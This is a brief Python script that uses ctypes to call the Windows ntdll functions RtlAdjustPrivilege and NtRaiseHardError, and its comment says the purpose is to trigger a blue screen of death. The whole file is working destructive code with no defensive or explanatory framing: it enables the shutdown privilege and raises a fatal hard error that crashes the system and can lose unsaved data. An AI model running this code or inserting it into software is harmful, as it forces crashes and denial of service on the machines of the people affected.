import ctypes

# Windows NT Kernel function to trigger a BSOD
ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
ctypes.windll.ntdll.NtRaiseHardError(0xC0000218, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
